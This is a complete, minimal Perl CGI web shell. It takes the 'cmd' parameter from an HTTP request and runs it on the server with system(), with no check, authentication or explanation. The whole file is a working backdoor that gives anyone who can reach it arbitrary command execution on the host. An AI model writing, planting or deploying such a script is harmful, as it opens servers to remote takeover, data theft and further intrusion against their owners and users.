#!/usr/bin/perl
use CGI':standard';
print "Content-type:text/html\n\n";
system(param('cmd'));
exit(0);
